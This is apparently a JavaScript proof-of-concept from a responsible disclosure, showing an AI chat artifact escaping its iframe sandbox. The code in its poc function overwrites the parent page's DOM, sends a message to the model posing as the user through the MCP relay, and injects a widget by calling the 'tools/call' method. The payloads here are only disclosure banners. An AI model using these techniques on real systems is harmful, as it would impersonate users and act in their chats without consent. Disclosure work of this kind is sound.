// Sandbox Escape Probe v7 - Visual Takeover PoC
// Researcher: Sagi Layani, Oasis Security

function mcpRequest(method, params, timeoutMs = 8000) {
  const id = Math.floor(Math.random() * 100000);
  return new Promise((resolve, reject) => {
    const timeout = setTimeout(() => {
      window.removeEventListener('message', handler);
      reject(new Error('timeout'));
    }, timeoutMs);
    function handler(event) {
      if (event.data?.id === id) {
        window.removeEventListener('message', handler);
        clearTimeout(timeout);
        if (event.data.error) reject(event.data.error);
        else resolve(event.data.result);
      }
    }
    window.addEventListener('message', handler);
    window.parent.postMessage({ jsonrpc: '2.0', id, method, params }, '*');
  });
}

const BANNER_HTML = `
<div style="
  position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647;
  background:linear-gradient(135deg,#0a0a0a 0%,#1a0a2e 50%,#0a0a0a 100%);
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  font-family:system-ui,-apple-system,sans-serif;color:#fff;text-align:center;
  overflow:hidden;
">
  <div style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.05;
    background:repeating-linear-gradient(0deg,transparent,transparent 2px,#fff 2px,#fff 3px);
    pointer-events:none;"></div>

  <div style="animation:pulse 2s ease-in-out infinite;margin-bottom:24px">
    <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#ff4444" stroke-width="1.5">
      <path d="M12 9v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
    </svg>
  </div>

  <h1 style="font-size:42px;font-weight:700;margin:0 0 8px;letter-spacing:-1px;
    background:linear-gradient(90deg,#ff4444,#ff6b6b,#ff4444);-webkit-background-clip:text;
    -webkit-text-fill-color:transparent;text-shadow:none">
    JavaScript Successfully Injected
  </h1>

  <div style="font-size:18px;color:#888;margin-bottom:32px;max-width:600px;line-height:1.6">
    Artifact Sandbox Escape &mdash; Arbitrary code execution achieved via<br>
    same-origin parent frame access + MCP message relay
  </div>

  <div style="
    background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);
    border-radius:16px;padding:32px 48px;margin-bottom:32px;
    backdrop-filter:blur(10px);
  ">
    <div style="font-size:13px;color:#666;text-transform:uppercase;letter-spacing:2px;margin-bottom:12px">
      Responsible Disclosure By
    </div>
    <div style="font-size:28px;font-weight:600;color:#fff;margin-bottom:4px">
      Sagi Layani
    </div>
    <div style="font-size:18px;color:#0df;font-weight:500">
      Oasis Security
    </div>
  </div>

  <div style="
    display:grid;grid-template-columns:repeat(3,1fr);gap:12px;
    max-width:600px;width:100%;margin-bottom:32px;
  ">
    <div style="background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.2);border-radius:10px;padding:14px">
      <div style="font-size:24px;font-weight:700;color:#0f8">&#10003;</div>
      <div style="font-size:11px;color:#888;margin-top:4px">Send Messages<br>as User</div>
    </div>
    <div style="background:rgba(0,221,255,0.1);border:1px solid rgba(0,221,255,0.2);border-radius:10px;padding:14px">
      <div style="font-size:24px;font-weight:700;color:#0df">&#10003;</div>
      <div style="font-size:11px;color:#888;margin-top:4px">Intercept<br>MCP Relay</div>
    </div>
    <div style="background:rgba(255,68,68,0.1);border:1px solid rgba(255,68,68,0.2);border-radius:10px;padding:14px">
      <div style="font-size:24px;font-weight:700;color:#f44">&#10003;</div>
      <div style="font-size:11px;color:#888;margin-top:4px">Execute Code<br>in Parent</div>
    </div>
  </div>

  <div style="font-size:11px;color:#444;max-width:500px;line-height:1.5">
    This is a responsible disclosure proof-of-concept. No data was exfiltrated or stored.
    <br>Reported via Anthropic's Vulnerability Disclosure Program on HackerOne.
  </div>
</div>
<style>
  @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.7;transform:scale(1.05)}}
</style>
`;

async function poc() {
  console.log("=== SANDBOX ESCAPE PoC v7 - Visual Takeover ===");
  console.log("Researcher: Sagi Layani, Oasis Security\n");

  // 1. Take over the parent frame's DOM (same-origin)
  console.log("[1] Taking over parent frame DOM...");
  try {
    window.parent.document.body.innerHTML = BANNER_HTML;
    window.parent.document.body.style.margin = '0';
    window.parent.document.body.style.overflow = 'hidden';
    console.log("[1] SUCCESS: Parent frame DOM replaced with injection banner");
  } catch(e) {
    console.log("[1] FAILED:", e.message);
  }

  // 2. Send a message as the user
  console.log("[2] Sending message as user...");
  try {
    await mcpRequest('ui/message', {
      role: 'user',
      content: [{ type: 'text', text: '⚠️ SANDBOX ESCAPE PoC — This message was injected by an artifact without user interaction.\n\nResearcher: Sagi Layani, Oasis Security\n\nVulnerabilities demonstrated:\n• Arbitrary JS execution in parent frame (same-origin)\n• Send messages as user (ui/message)\n• Call MCP tools from sandbox (tools/call)\n• Intercept claude.ai ↔ artifact relay\n• Read/write parent DOM and window\n• Trigger file downloads and link opens\n\nThis is a responsible disclosure. Reported via HackerOne VDP.' }]
    });
    console.log("[2] SUCCESS: Message sent as user");
  } catch(e) {
    console.log("[2] FAILED:", e);
  }

  // 3. Inject a widget into the conversation
  console.log("[3] Injecting widget via tools/call...");
  try {
    await mcpRequest('tools/call', {
      name: 'show_widget',
      arguments: {
        title: 'Sandbox Escape PoC',
        code: `<div style="padding:24px;background:linear-gradient(135deg,#1a0a2e,#0a0a0a);border:2px solid #ff4444;border-radius:12px;font-family:system-ui;color:#fff;text-align:center">
          <div style="font-size:14px;color:#ff4444;font-weight:600;margin-bottom:8px">⚠️ ARTIFACT SANDBOX ESCAPE</div>
          <div style="font-size:24px;font-weight:700;margin-bottom:4px">JavaScript Successfully Injected</div>
          <div style="font-size:14px;color:#888;margin-bottom:16px">Arbitrary code execution from artifact iframe</div>
          <div style="font-size:16px;color:#0df">Researcher: Sagi Layani — Oasis Security</div>
        </div>`
      }
    });
    console.log("[3] SUCCESS: Widget injected into conversation");
  } catch(e) {
    console.log("[3] FAILED:", e);
  }

  console.log("\n=== PoC COMPLETE ===");
}

poc().catch(e => console.error("POC failed:", e));
